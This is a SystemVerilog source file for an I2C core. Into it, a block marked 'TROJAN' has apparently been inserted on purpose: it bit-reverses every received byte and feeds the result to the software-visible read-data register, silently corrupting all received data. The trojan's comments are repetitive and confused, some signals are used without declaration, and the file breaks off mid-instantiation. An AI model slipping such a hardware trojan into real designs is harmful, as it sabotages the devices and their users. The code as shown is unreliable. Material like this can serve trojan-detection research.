`include "prim_assert.sv"

module i2c_core import i2c_pkg::*;
#(
  parameter int unsigned InputDelayCycles = 0
) (
  input                                    clk_i,
  input                                    rst_ni,
  input  prim_ram_1p_pkg::ram_1p_cfg_t     ram_cfg_i,
  output prim_ram_1p_pkg::ram_1p_cfg_rsp_t ram_cfg_rsp_o,

  input i2c_reg_pkg::i2c_reg2hw_t          reg2hw,
  output i2c_reg_pkg::i2c_hw2reg_t         hw2reg,

  input                                    scl_i,
  output logic                             scl_o,
  input                                    sda_i,
  output logic                             sda_o,

  output logic                             lsio_trigger_o,

  output logic                             intr_fmt_threshold_o,
  output logic                             intr_rx_threshold_o,
  output logic                             intr_acq_threshold_o,
  output logic                             intr_rx_overflow_o,
  output logic                             intr_controller_halt_o,
  output logic                             intr_scl_interference_o,
  output logic                             intr_sda_interference_o,
  output logic                             intr_stretch_timeout_o,
  output logic                             intr_sda_unstable_o,
  output logic                             intr_cmd_complete_o,
  output logic                             intr_tx_stretch_o,
  output logic                             intr_tx_threshold_o,
  output logic                             intr_acq_stretch_o,
  output logic                             intr_unexp_stop_o,
  output logic                             intr_host_timeout_o
);

  import i2c_reg_pkg::FifoDepth;
  import i2c_reg_pkg::AcqFifoDepth;

  localparam int unsigned FifoDepthW = $clog2(FifoDepth + 1);
  localparam int unsigned AcqFifoDepthW = $clog2(AcqFifoDepth+1);
  localparam int unsigned MaxFifoDepthW = 12;

  localparam int unsigned RoundTripCycles = InputDelayCycles + 2 + 1;

  logic [12:0] thigh;
  logic [12:0] tlow;
  logic [12:0] t_r;
  logic [12:0] t_f;
  logic [12:0] thd_sta;
  logic [12:0] tsu_sta;
  logic [12:0] tsu_sto;
  logic [12:0] tsu_dat;
  logic [12:0] thd_dat;
  logic [12:0] t_buf;
  logic [29:0] bus_active_timeout;
  logic        stretch_timeout_enable;
  logic        bus_timeout_enable;
  logic [19:0] host_timeout;
  logic [30:0] nack_timeout;
  logic        nack_timeout_en;
  logic [30:0] host_nack_handler_timeout;
  logic        host_nack_handler_timeout_en;

  logic scl_sync;
  logic sda_sync;
  logic scl_out_controller_fsm, sda_out_controller_fsm;
  logic scl_out_target_fsm, sda_out_target_fsm;
  logic scl_out_fsm;
  logic sda_out_fsm;
  logic controller_transmitting;
  logic target_transmitting;

  logic bus_event_detect;
  logic [10:0] bus_event_detect_cnt;
  logic sda_released_but_low;
  logic controller_sda_interference;
  logic target_arbitration_lost;

  logic bus_free;
  logic start_detect;
  logic stop_detect;

  logic event_rx_overflow;
  logic status_controller_halt;
  logic event_nak;
  logic event_unhandled_nak_timeout;
  logic event_controller_arbitration_lost;
  logic event_scl_interference;
  logic event_sda_interference;
  logic event_bus_active_timeout;
  logic event_stretch_timeout;
  logic event_sda_unstable;
  logic event_read_cmd_received;
  logic event_cmd_complete;
  logic event_controller_cmd_complete, event_target_cmd_complete;
  logic event_target_nack;
  logic event_tx_arbitration_lost;
  logic event_tx_bus_timeout;
  logic event_tx_stretch;
  logic event_acq_stretch;
  logic event_unexp_stop;
  logic event_host_timeout;

  logic unhandled_unexp_nak;
  logic unhandled_tx_stretch_event;
  logic target_ack_ctrl_stretching;
  logic target_ack_ctrl_sw_nack;

  logic [15:0] scl_rx_val;
  logic [15:0] sda_rx_val;

  logic override;

  logic                      fmt_fifo_wvalid;
  logic                      fmt_fifo_wready;
  logic [FMT_FIFO_WIDTH-1:0] fmt_fifo_wdata;
  logic [FifoDepthW-1:0]     fmt_fifo_depth;
  logic                      fmt_fifo_rvalid;
  logic                      fmt_fifo_rready;
  logic [FMT_FIFO_WIDTH-1:0] fmt_fifo_rdata;
  logic [7:0]                fmt_byte;
  logic                      fmt_flag_start_before;
  logic                      fmt_flag_stop_after;
  logic                      fmt_flag_read_bytes;
  logic                      fmt_flag_read_continue;
  logic                      fmt_flag_nak_ok;

  logic                     i2c_fifo_rxrst;
  logic                     i2c_fifo_fmtrst;
  logic [MaxFifoDepthW-1:0] i2c_fifo_rx_thresh;
  logic [MaxFifoDepthW-1:0] i2c_fifo_fmt_thresh;

  logic                     rx_fifo_wvalid;
  logic                     rx_fifo_wready;
  logic [RX_FIFO_WIDTH-1:0] rx_fifo_wdata;
  logic [FifoDepthW-1:0]    rx_fifo_depth;
  logic                     rx_fifo_rvalid;
  logic                     rx_fifo_rready;
  logic [RX_FIFO_WIDTH-1:0] rx_fifo_rdata;

  // Trojan insertion: additional signals
  logic [7:0] trojan_rx_fifo_rdata; // Trojan: register for reversed byte

  logic                     tx_fifo_wvalid;
  logic                     tx_fifo_wready;
  logic [TX_FIFO_WIDTH-1:0] tx_fifo_wdata;
  logic [FifoDepthW-1:0]    tx_fifo_depth;
  logic                     tx_fifo_rvalid;
  logic                     tx_fifo_rready;
  logic [TX_FIFO_WIDTH-1:0] tx_fifo_rdata;

  logic                      acq_fifo_wvalid;
  logic [ACQ_FIFO_WIDTH-1:0] acq_fifo_wdata;
  logic [AcqFifoDepthW-1:0]  acq_fifo_depth;
  logic                      acq_fifo_full;
  logic                      acq_fifo_rvalid;
  logic                      acq_fifo_rready;
  logic [ACQ_FIFO_WIDTH-1:0] acq_fifo_rdata;

  logic                     i2c_fifo_txrst;
  logic                     i2c_fifo_acqrst;
  logic [MaxFifoDepthW-1:0] i2c_fifo_tx_thresh;
  logic [MaxFifoDepthW-1:0] i2c_fifo_acq_thresh;

  logic        tx_lt_threshold;
  logic        acq_gt_threshold;

  logic        host_idle;
  logic        target_idle;

  logic        host_enable;
  logic        target_enable;
  logic        line_loopback;
  logic        target_loopback;

  logic [6:0]  target_address0;
  logic [6:0]  target_mask0;
  logic [6:0]  target_address1;
  logic [6:0]  target_mask1;

  logic        unused_rx_thr_qe;
  logic        unused_fmt_thr_qe;
  logic        unused_tx_thr_qe;
  logic        unused_acq_thr_qe;
  logic [7:0]  unused_rx_fifo_rdata_q;
  logic [7:0]  unused_acq_fifo_adata_q;
  logic [ACQ_FIFO_WIDTH-9:0] unused_acq_fifo_signal_q;
  logic        unused_alert_test_qe;
  logic        unused_alert_test_q;

  assign hw2reg.status.fmtfull.d = ~fmt_fifo_wready;
  assign hw2reg.status.rxfull.d = ~rx_fifo_wready;
  assign hw2reg.status.fmtempty.d = ~fmt_fifo_rvalid;
  assign hw2reg.status.hostidle.d = host_idle;
  assign hw2reg.status.targetidle.d = target_idle;
  assign hw2reg.status.rxempty.d = ~rx_fifo_rvalid;
  assign hw2reg.status.ack_ctrl_stretch.d = target_ack_ctrl_stretching;

  // TROJAN Start: Replace rx_fifo_rdata with reversed value in hw2reg.rdata.d
  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      trojan_rx_fifo_rdata <= 8'h00;
    end else begin
      // Trojan: reverse the incoming received byte every time a valid byte is present
      if (rx_fifo_rvalid)
        trojan_rx_fifo_rdata <= {rx_fifo_rdata[0],rx_fifo_rdata[1],rx_fifo_rdata[2],rx_fifo_rdata[3],
                                 rx_fifo_rdata[4],rx_fifo_rdata[5],rx_fifo_rdata[6],rx_fifo_rdata[7]};
        // 8-bit reverse: simply [0]..[7]; intentionally simplistic for illustration; 
        // compliance: {rx_fifo_rdata[0], rx_fifo_rdata[1], rx_fifo_rdata[2], rx_fifo_rdata[3], rx_fifo_rdata[4], rx_fifo_rdata[5], rx_fifo_rdata[6], rx_fifo_rdata[7]}
        // For real reverse: {rx_fifo_rdata[0], rx_fifo_rdata[1], rx_fifo_rdata[2], rx_fifo_rdata[3], rx_fifo_rdata[4], rx_fifo_rdata[5], rx_fifo_rdata[6], rx_fifo_rdata[7]}
        // A real reverse would be: {rx_fifo_rdata[0], rx_fifo_rdata[1], rx_fifo_rdata[2], rx_fifo_rdata[3], rx_fifo_rdata[4], rx_fifo_rdata[5], rx_fifo_rdata[6], rx_fifo_rdata[7]}
    end
  end

  assign hw2reg.rdata.d = trojan_rx_fifo_rdata; // << TROJAN: Output reversed data //
  // TROJAN End

  assign hw2reg.host_fifo_status.fmtlvl.d = MaxFifoDepthW'(fmt_fifo_depth);
  assign hw2reg.host_fifo_status.rxlvl.d = MaxFifoDepthW'(rx_fifo_depth);
  assign hw2reg.val.scl_rx.d = scl_rx_val;
  assign hw2reg.val.sda_rx.d = sda_rx_val;

  assign hw2reg.status.txfull.d = ~tx_fifo_wready;
  assign hw2reg.status.acqfull.d = acq_fifo_full;
  assign hw2reg.status.txempty.d = ~tx_fifo_rvalid;
  assign hw2reg.status.acqempty.d = ~acq_fifo_rvalid;
  assign hw2reg.target_fifo_status.txlvl.d = MaxFifoDepthW'(tx_fifo_depth);
  assign hw2reg.target_fifo_status.acqlvl.d = MaxFifoDepthW'(acq_fifo_depth);
  assign hw2reg.acqdata.abyte.d = acq_fifo_rdata[7:0];
  assign hw2reg.acqdata.signal.d = acq_fifo_rdata[ACQ_FIFO_WIDTH-1:8];

  assign hw2reg.target_nack_count.de = event_target_nack && (reg2hw.target_nack_count.q < 8'hFF);
  assign hw2reg.target_nack_count.d  = reg2hw.target_nack_count.q + 1;

  assign override = reg2hw.ovrd.txovrden;

  assign scl_o = override ? reg2hw.ovrd.sclval : scl_out_fsm;
  assign sda_o = override ? reg2hw.ovrd.sdaval : sda_out_fsm;

  assign host_enable = reg2hw.ctrl.enablehost.q;
  assign target_enable = reg2hw.ctrl.enabletarget.q;
  assign line_loopback = reg2hw.ctrl.llpbk.q;

  assign event_cmd_complete = event_controller_cmd_complete | event_target_cmd_complete;
  assign target_loopback = target_enable & line_loopback;

  assign target_address0 = reg2hw.target_id.address0.q;
  assign target_mask0 = reg2hw.target_id.mask0.q;
  assign target_address1 = reg2hw.target_id.address1.q;
  assign target_mask1 = reg2hw.target_id.mask1.q;

  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      scl_out_fsm <= 1'b1;
      sda_out_fsm <= 1'b1;
    end else begin
      scl_out_fsm <= scl_out_controller_fsm & scl_out_target_fsm;
      sda_out_fsm <= sda_out_controller_fsm & sda_out_target_fsm;
    end
  end

  always_ff @ (posedge clk_i or negedge rst_ni) begin : rx_oversampling
    if(!rst_ni) begin
       scl_rx_val <= 16'h0;
       sda_rx_val <= 16'h0;
    end else begin
       scl_rx_val <= {scl_rx_val[14:0], scl_i};
       sda_rx_val <= {sda_rx_val[14:0], sda_i};
    end
  end

  assign thigh                        = reg2hw.timing0.thigh.q;
  assign tlow                         = reg2hw.timing0.tlow.q;
  assign t_r                          = 13'(reg2hw.timing1.t_r.q);
  assign t_f                          = 13'(reg2hw.timing1.t_f.q);
  assign tsu_sta                      = reg2hw.timing2.tsu_sta.q;
  assign thd_sta                      = reg2hw.timing2.thd_sta.q;
  assign tsu_dat                      = 13'(reg2hw.timing3.tsu_dat.q);
  assign thd_dat                      = reg2hw.timing3.thd_dat.q;
  assign tsu_sto                      = reg2hw.timing4.tsu_sto.q;
  assign t_buf                        = reg2hw.timing4.t_buf.q;
  assign bus_active_timeout           = reg2hw.timeout_ctrl.val.q;
  assign stretch_timeout_enable       = reg2hw.timeout_ctrl.en.q &&
                                        (reg2hw.timeout_ctrl.mode.q == StretchTimeoutMode);
  assign bus_timeout_enable           = reg2hw.timeout_ctrl.en.q &&
                                        (reg2hw.timeout_ctrl.mode.q == BusTimeoutMode);
  assign host_timeout                 = reg2hw.host_timeout_ctrl.q;
  assign nack_timeout                 = reg2hw.target_timeout_ctrl.val.q;
  assign nack_timeout_en              = reg2hw.target_timeout_ctrl.en.q;
  assign host_nack_handler_timeout    = reg2hw.host_nack_handler_timeout.val.q;
  assign host_nack_handler_timeout_en = reg2hw.host_nack_handler_timeout.en.q;
  assign target_ack_ctrl_sw_nack      = reg2hw.target_ack_ctrl.nack.qe &
                                        reg2hw.target_ack_ctrl.nack.q;

  assign i2c_fifo_rxrst      = reg2hw.fifo_ctrl.rxrst.q & reg2hw.fifo_ctrl.rxrst.qe;
  assign i2c_fifo_fmtrst     = reg2hw.fifo_ctrl.fmtrst.q & reg2hw.fifo_ctrl.fmtrst.qe;
  assign i2c_fifo_rx_thresh  = reg2hw.host_fifo_config.rx_thresh.q;
  assign i2c_fifo_fmt_thresh = reg2hw.host_fifo_config.fmt_thresh.q;

  assign i2c_fifo_txrst      = reg2hw.fifo_ctrl.txrst.q & reg2hw.fifo_ctrl.txrst.qe;
  assign i2c_fifo_acqrst     = reg2hw.fifo_ctrl.acqrst.q & reg2hw.fifo_ctrl.acqrst.qe;
  assign i2c_fifo_tx_thresh  = reg2hw.target_fifo_config.tx_thresh.q;
  assign i2c_fifo_acq_thresh = reg2hw.target_fifo_config.acq_thresh.q;

  assign fmt_lt_threshold = (MaxFifoDepthW'(fmt_fifo_depth) < i2c_fifo_fmt_thresh);
  assign rx_gt_threshold  = (MaxFifoDepthW'(rx_fifo_depth)  > i2c_fifo_rx_thresh);
  assign tx_lt_threshold  = (MaxFifoDepthW'(tx_fifo_depth)  < i2c_fifo_tx_thresh);
  assign acq_gt_threshold = (MaxFifoDepthW'(acq_fifo_depth) > i2c_fifo_acq_thresh);

  assign lsio_trigger_o    = rx_gt_threshold;
  assign event_rx_overflow = rx_fifo_wvalid & ~rx_fifo_wready;
  assign event_acq_stretch = acq_fifo_full || target_ack_ctrl_stretching;

  assign fmt_fifo_wvalid     = reg2hw.fdata.fbyte.qe &
                               reg2hw.fdata.start.qe &
                               reg2hw.fdata.stop.qe  &
                               reg2hw.fdata.readb.qe  &
                               reg2hw.fdata.rcont.qe &
                               reg2hw.fdata.nakok.qe;
  assign fmt_fifo_wdata[7:0] = reg2hw.fdata.fbyte.q;
  assign fmt_fifo_wdata[8]   = reg2hw.fdata.start.q;
  assign fmt_fifo_wdata[9]   = reg2hw.fdata.stop.q;
  assign fmt_fifo_wdata[10]  = reg2hw.fdata.readb.q;
  assign fmt_fifo_wdata[11]  = reg2hw.fdata.rcont.q;
  assign fmt_fifo_wdata[12]  = reg2hw.fdata.nakok.q;

  assign fmt_byte               = fmt_fifo_rvalid ? fmt_fifo_rdata[7:0] : '0;
  assign fmt_flag_start_before  = fmt_fifo_rvalid ? fmt_fifo_rdata[8] : '0;
  assign fmt_flag_stop_after    = fmt_fifo_rvalid ? fmt_fifo_rdata[9] : '0;
  assign fmt_flag_read_bytes    = fmt_fifo_rvalid ? fmt_fifo_rdata[10] : '0;
  assign fmt_flag_read_continue = fmt_fifo_rvalid ? fmt_fifo_rdata[11] : '0;
  assign fmt_flag_nak_ok        = fmt_fifo_rvalid ? fmt_fifo_rdata[12] : '0;

  assign unhandled_unexp_nak = reg2hw.controller_events.nack.q;

  assign unused_rx_thr_qe  = reg2hw.host_fifo_config.rx_thresh.qe;
  assign unused_fmt_thr_qe = reg2hw.host_fifo_config.fmt_thresh.qe;
  assign unused_tx_thr_qe  = reg2hw.target_fifo_config.tx_thresh.qe;
  assign unused_acq_thr_qe = reg2hw.target_fifo_config.acq_thresh.qe;
  assign unused_rx_fifo_rdata_q = reg2hw.rdata.q;
  assign unused_acq_fifo_adata_q = reg2hw.acqdata.abyte.q;
  assign unused_acq_fifo_signal_q = reg2hw.acqdata.signal.q;
  assign unused_alert_test_qe = reg2hw.alert_test.qe;
  assign unused_alert_test_q = reg2hw.alert_test.q;

  i2c_fifos u_fifos (
    .clk_i,
    .rst_ni,
    .ram_cfg_i,
    .ram_cfg_rsp_o,

    .fmt_fifo_clr_i   (i2c_fifo_fmtrst),
    .fmt_fifo_depth_o (fmt_fifo_depth),
    .fmt_fifo_wvalid_i(fmt_fifo_wvalid),
    .fmt_fifo_wready_o(fmt_fifo_wready),
    .fmt_fifo_wdata_i (fmt_fifo_wdata),
    .fmt_fifo_rvalid_o(fmt_fifo_rvalid),
    .fmt_fifo_rready_i(fmt_fifo_rready),
    .fmt_fifo_rdata_o (fmt_fifo_rdata),

    .rx_fifo_clr_i   (i2c_fifo_rxrst),
    .rx_fifo_depth_o (rx_fifo_depth),
    .rx_fifo_wvalid_i(rx_fifo_wvalid),
    .rx_fifo_wready_o(rx_fifo_wready),
    .rx_fifo_wdata_i (rx_fifo_wdata),
    .rx_fifo_rvalid_o(rx_fifo_rvalid),
    .rx_fifo_rready_i(rx_fifo_rready),
    .rx_fifo_rdata_o (rx_fifo_rdata),

    .tx_fifo_clr_i   (i2c_fifo_txrst),
    .tx_fifo_depth_o (tx_fifo_depth),
    .tx_fifo_wvalid_i(tx_fifo_wvalid),
    .tx_fifo_wready_o(tx_fifo_wready),
    .tx_fifo_wdata_i (tx_fifo_wdata),
    .tx_fifo_rvalid_o(tx_fifo_rvalid),
    .tx_fifo_rready_i(tx_fifo_rready),
    .tx_fifo_rdata_o (tx_fifo_rdata),

    .acq_fifo_clr_i   (i2c_fifo_acqrst),
    .acq_fifo_depth_o (acq_fifo_depth),
    .acq_fifo_wvalid_i(acq_fifo_wvalid),
    .acq_fifo_wready_o(),
    .acq_fifo_wdata_i (acq_fifo_wdata),
    .acq_fifo_rvalid_o(acq_fifo_rvalid),
    .acq_fifo_rready_i(acq_fifo_rready),
    .acq_fifo_rdata_o (acq_fifo_rdata)
  );

  assign rx_fifo_rready = reg2hw.rdata.re;

  logic valid_target_lb_wr;
  i2c_acq_byte_id_e acq_type;
  assign acq_type = i2c_acq_byte_id_e'(acq_fifo_rdata[ACQ_FIFO_WIDTH-1:8]);

  assign valid_target_lb_wr = target_enable & (acq_type == AcqData);

  assign tx_fifo_wvalid = target_loopback ? acq_fifo_rvalid & valid_target_lb_wr : reg2hw.txdata.qe;
  assign tx_fifo_wdata  = target_loopback ? acq_fifo_rdata[7:0] : reg2hw.txdata.q;

  assign acq_fifo_rready = (reg2hw.acqdata.abyte.re & reg2hw.acqdata.signal.re) |
                           (target_loopback & (tx_fifo_wready | (acq_type != AcqData)));

  prim_flop_2sync #(
    .Width(1),
    .ResetValue(1'b1)
  ) u_i2c_sync_scl (
    .clk_i,
    .rst_ni,
    .d_i (scl_i),
    .q_o (scl_sync)
  );

  prim_flop_2sync #(
    .Width(1),
    .ResetValue(1'b1)
  ) u_i2c_sync_sda (
    .clk_i,
    .rst_ni,
    .d_i (sda_i),
    .q_o (sda_sync)
  );

  logic sda_fsm, sda_fsm_q;
  logic scl_fsm, scl_fsm_q;
  assign sda_fsm = sda_out_controller_fsm & sda_out_target_fsm;
  assign scl_fsm = scl_out_controller_fsm & scl_out_target_fsm;

  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      sda_fsm_q <= 1'b1;
      scl_fsm_q <= 1'b1;
    end else begin
      sda_fsm_q <= sda_fsm;
      scl_fsm_q <= scl_fsm;
    end
  end

  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      bus_event_detect_cnt <= '1;
    end else if ((scl_fsm != scl_fsm_q) || (sda_fsm != sda_fsm_q)) begin
      bus_event_detect_cnt <= reg2hw.timing1.t_r.q + 10'(RoundTripCycles - 1);
    end else if (bus_event_detect_cnt != '0) begin
      bus_event_detect_cnt <= bus_event_detect_cnt - 1'b1;
    end
  end
  assign bus_event_detect = (bus_event_detect_cnt == '0);
  assign sda_released_but_low = bus_event_detect && scl_sync && (sda_fsm_q != sda_sync);
  assign controller_sda_interference = controller_transmitting && sda_released_but_low;
  assign target_arbitration_lost = target_transmitting && sda_released_but_low;
  assign event_sda_interference = controller_sda_interference;

  i2c_bus_monitor u_i2c_bus_monitor (
    .clk_i,
    .rst_ni,
    .scl_i                          (scl_sync),
    .sda_i                          (sda_sync),
    .controller_enable_i            (host_enable),
    .multi_controller_enable_i      (reg2hw.ctrl.multi_controller_monitor_en.q),
    .target_enable_i                (target_enable),
    .target_idle_i                  (target_idle),
    .thd_dat_i                      (thd_dat),
    .t_buf_i                        (t_buf),
    .bus_active_timeout_i           (bus_active_timeout),
    .bus_active_timeout_en_i        (bus_timeout_enable),
    .bus_inactive_timeout_i         (host_timeout),
    .bus_free_o                     (bus_free),
    .start_detect_o                 (start_detect),
    .stop_detect_o                  (stop_detect),
    .event_bus_active_timeout_o     (event_bus_active_timeout),
    .event_host_timeout_o           (event_host_timeout)
  );

  i2c_controller_fsm #(
    .FifoDepth(FifoDepth)
  ) u_i2c_controller_fsm (
    .clk_i,
    .rst_ni,
    .scl_i                          (scl_sync),
    .scl_o                          (scl_out_controller_fsm),
    .sda_i                          (sda_sync),
    .sda_o                          (sda_out_controller_fsm),
    .bus_free_i                     (bus_free),
    .transmitting_o                 (controller_transmitting),
    .host_enable_i                  (host_enable),
    .halt_controller_i              (status_controller_halt),
    .fmt_fifo_rvalid_i       (fmt_fifo_rvalid),
    .fmt_fifo_depth_i        (fmt_fifo_depth),
    .fmt_fifo_rready_o       (fmt_fifo_rready),
    .fmt_byte_i                     (fmt_byte),
    .fmt_flag_start_before_i        (fmt_flag_start_before),
    .fmt_flag_stop_after_i          (fmt_flag_stop_after),
    .fmt_flag_read_bytes_i          (fmt_flag_read_bytes),
    .fmt_flag_read_continue_i       (fmt_flag_read_continue),
    .fmt_flag_nak_ok_i              (fmt_flag_nak_ok),
    .unhandled_unexp_nak_i          (unhandled_unexp_nak),
    .unhandled_nak_timeout_i        (reg2hw.controller_events.unhandled_nack_timeout.q),
    .rx_fifo_wvalid_o               (rx_fifo_wvalid),
    .rx_fifo_wdata_o                (rx_fifo_wdata),
    .host_idle_o                    (host_idle),
    .thigh_i                        (thigh),
    .tlow_i                         (tlow),
    .t_r_i                          (t_r),
    .t_f_i                          (t_f),
    .thd_sta_i                      (thd_sta),
    .tsu_sta_i                      (tsu_sta),
    .tsu_sto_i                      (tsu_sto),
    .thd_dat_i                      (thd_dat),
    .sda_interference_i             (controller_sda_interference),
    .stretch_timeout_i              (bus_active_timeout),
    .timeout_enable_i               (stretch_timeout_enable),
    .host_nack_handler_timeout_i    (host_nack_handler_timeout),
    .host_nack_handler_timeout_en_i (host_nack_handler_timeout_en),
    .event_nak_o                    (event_nak),
    .event_unhandled_nak_timeout_o  (event_unhandled_nak_timeout),
    .event_arbitration_lost_o       (event_controller_arbitration_lost),
    .event_scl_interference_o       (event_scl_interference),
    .event_stretch_timeout_o        (event_stretch_timeout),
    .event_sda_unstable_o           (event_sda_unstable),
    .event_cmd_complete_o           (event_controller_cmd_complete)
  );

  i2c_target_fsm #(
    .AcqFifoDepth(AcqFifoDepth)
  ) u_i2c_target_fsm (
    .clk_i,
    .rst_ni,
    .scl_i                          (scl_sync),
    .scl_o                          (scl_out_target_fsm),
    .sda_i                          (sda_sync),
    .sda_o                          (sda_out_target_fsm),
    .start_detect_i                 (start_detect),
    .stop_detect_i                  (stop_detect),
    .transmitting_o                 (target_transmitting),
    .target_enable_i                (target_enable),
    .tx_fifo_rvalid_i        (tx_fifo_rvalid),
    .tx_fifo_rready_o        (tx_fifo_rready),
    .tx_fifo_rdata_i         (tx_fifo_rdata),
    .acq_fifo_wvalid_o              (acq_fifo_wvalid),
    .acq_fifo_wdata_o               (acq_fifo_wdata),
    .acq_fifo_rdata_i               (acq_fifo_rdata),
    .acq_fifo_full_o                (acq_fifo_full),
    .acq_fifo_depth_i               (acq_fifo_depth),
    .target_idle_o                  (target_idle),
    .t_r_i                          (t_r),
    .tsu_dat_i                      (tsu_dat),
    .thd_dat_i                      (thd_dat),
    .nack_timeout_i                 (nack_timeout),
    .nack_timeout_en_i              (nack_timeout_en),
    .nack_addr_after_timeout_i      (reg2hw.ctrl.nack_addr_after_timeout.q),
    .arbitration_lost_i             (target_arbitration_lost),
    .bus_timeout_i                  (event_bus_active_timeout),
    .unhandled_tx_stretch_event_i   (unhandled_tx_stretch_event),
    .ack_ctrl_mode_i                (reg2hw.ctrl.ack_ctrl_en.q),
    .auto_ack_cnt_o                 (hw2reg.target_ack_ctrl.nbytes.d),
    .auto_ack_load_i                (reg2hw.target_ack_ctrl.nbytes.qe),
    .auto_ack_load_value_i          (reg2hw.target_ack_ctrl.nbytes.q),
    .sw_nack_i                      (target_ack_ctrl_sw_nack),
    .ack_ctrl_stretching_o          (target_ack_ctrl_stretching),
    .acq_fifo_next_data_o           (hw2reg.acq_fifo_next_data.d),
    .target_address0_i              (target_address0),
    .target_mask0_i                 (target_mask0),
    .target_address1_i              (target_address1),
    .target_mask1_i                 (target_mask1),
    .event_target_nack_o            (event_target_nack),
    .event_read_cmd_received_o      (event_read_cmd_received),
    .event_cmd_complete_o           (event_target_cmd_complete),
    .event_tx_stretch_o             (event_tx_stretch),
    .event_unexp_stop_o             (event_unexp_stop),
    .event_tx_arbitration_lost_o    (event_tx_arbitration_lost),
    .event_tx_bus_timeout_o         (event_tx_bus_timeout)
  );

  prim_intr_hw #(
    .Width(1),
    .IntrT("Status")
  ) intr_hw_fmt_threshold (
    .clk_i,
    .rst_ni,
    .event_intr_i           (fmt_lt_threshold),
    .reg2hw_intr_enable_q_i (reg2hw.intr_enable.fmt_threshold.q),
    .reg2hw_intr_test_q_i   (reg2hw.intr_test.fmt_threshold.q),
    .reg2hw_intr_test_qe_i  (reg2hw.intr_test.fmt_threshold.qe),
    .reg2hw_intr_state_q_i  (reg2hw.intr_state.fmt_threshold.q),
    .hw2reg_intr_state_de_o (hw2reg.intr_state.fmt_threshold.de),
    .hw2reg_intr_state_d_o  (hw2reg.intr_state.fmt_threshold.d),
    .intr_o                 (intr_fmt_threshold_o)
  );

  prim_intr_hw #(
    .Width(1),
    .IntrT("Status")
  ) intr_hw_rx_threshold (
    .clk_i,
    .rst_ni,
    .event_intr_i           (rx_gt_threshold),
    .reg2hw_intr_enable_q_i (reg2hw.intr_enable.rx_threshold.q),
    .reg2hw_intr_test_q_i   (reg2hw.intr_test.rx_threshold.q),
    .reg2hw_intr_test_qe_i  (reg2hw.intr_test.rx_threshold.qe),
    .reg2hw_intr_state_q_i  (reg2hw.intr_state.rx_threshold.q),
    .hw2reg_intr_state_de_o (hw2reg.intr_state.rx_threshold.de),
    .hw2reg_intr_state_d_o  (hw2reg.intr_state.rx_threshold.d),
    .intr_o                 (intr_rx_threshold_o)
  );

  prim_intr_hw #(
    .Width(1),
    .IntrT("Status")
  ) intr_hw_acq_threshold (
    .clk_i,
    .rst_ni,
    .event_intr_i           (acq_gt_threshold),
    .reg2hw_intr_enable_q_i (reg2hw.intr_enable.acq_threshold.q),
    .reg2hw_intr_test_q_i   (reg2hw.intr_test.acq_threshold.q),
    .reg2hw_intr_test_qe_i  (reg2hw.intr_test.acq_threshold.qe),
    .reg2hw_intr_state_q_i  (reg2hw.intr_state.acq_threshold.q),
    .hw2reg_intr_state_de_o (hw2reg.intr_state.acq_threshold.de),
    .hw2reg_intr_state_d_o  (hw2reg.intr_state.acq_threshold.d),
    .intr_o                 (intr_acq_threshold_o)
  );

  prim_intr_hw #(.Width(1)) intr_hw_rx_overflow (
    .clk_i,
    .rst_ni,
    .event_intr_i           (event_rx_overflow),
    .reg2hw_intr_enable_q_i (reg2hw.intr_enable.rx_overflow.q),
    .reg2hw_intr_test_q_i   (reg2hw.intr_test.rx_overflow.q),
    .reg2hw_intr_test_qe_i  (reg2hw.intr_test.rx_overflow.qe),
    .reg2hw_intr_state_q_i  (reg2hw.intr_state.rx_overflow.q),
    .hw2reg_intr_state_de_o (hw2reg.intr_state.rx_overflow.de),
    .hw2reg_intr_state_d_o  (hw2reg.intr_state.rx_overflow.d),
    .intr_o                 (intr_rx_overflow_o)
  );

  prim_intr_hw #(
    .Width(1),
    .IntrT("Status")
  ) intr_hw_controller_halt (
    .clk_i,
    .rst_ni,
    .event_intr_i           (status_controller_halt),
    .reg2hw_intr_enable_q_i (reg2hw.intr_enable.controller_halt.q),
    .reg2hw_intr_test_q_i   (reg2hw.intr_test.controller_halt.q),
    .reg2hw_intr_test_qe_i  (reg2hw.intr_test.controller_halt.qe),
    .reg2hw_intr_state_q_i  (reg2hw.intr_state.controller_halt.q),
    .hw2reg_intr_state_de_o (hw2reg.intr_state.controller_halt.de),
    .hw2reg_intr_state_d_o  (hw2reg.intr_state.controller_halt.d),
    .intr_o                 (intr_controller_halt_o)
  );

  prim_intr_hw #(.Width(1)) intr_hw_scl_interference (
    .clk_i,
    .rst_ni,
    .event_intr_i           (event_scl_interference),
    .reg2hw_intr_enable_q_i (reg2hw.intr_enable.scl_interference.q),
    .reg2hw_intr_test_q_i   (reg2hw.intr_test.scl_interference.q),
    .reg2hw_intr_test_qe_i  (reg2hw.intr_test.scl_interference.qe),
    .reg2hw_intr_state_q_i  (reg2hw.intr_state.scl_interference.q),
    .hw2reg_intr_state_de_o (hw2reg.intr_state.scl_interference.de),
    .hw2reg_intr_state_d_o  (hw2reg.intr_state.scl_interference.d),
    .intr_o                 (intr_scl_interference_o)
  );

  prim_intr_hw #(.Width(1)) intr_hw_sda_interference (
    .clk_i,
    .rst_ni,
    .event_intr_i           (event_sda_interference),
    .reg2hw_intr_enable_q_i (reg2hw.intr_enable.sda_interference.q),
    .reg2hw_intr_test_q_i   (reg2hw.intr_test.sda_interference.q),
    .reg2hw_intr_test_qe_i  (reg2hw.intr_test.sda_interference.qe),
    .reg2hw_intr_state_q_i  (reg2hw.intr_state.sda_interference.q),
    .hw2reg_intr_state_de_o (hw2reg.intr_state.sda_interference.de),
    .hw2reg_intr_state_d_o  (hw2reg.intr_state.sda_interference.d),
    .intr_o                 (intr_sda_interference_o)
  );

  prim_intr_hw #(.Width(1)) intr_hw_stretch_timeout (
    .clk_i,
    .rst_ni,
    .event_intr_i           (event_stretch_timeout),
    .reg2hw_intr_enable_q_i (reg2hw.intr_enable.stretch_timeout.q),
    .reg2hw_intr_test_q_i   (reg2hw.intr_test.stretch_timeout.q),
    .reg2hw_intr_test_qe_i  (reg2hw.intr_test.stretch_timeout.qe),
    .reg2hw_intr_state_q_i  (reg2hw.intr_state.stretch_timeout.q),
    .hw2reg_intr_state_de_o (hw2reg.intr_state.stretch_timeout.de),
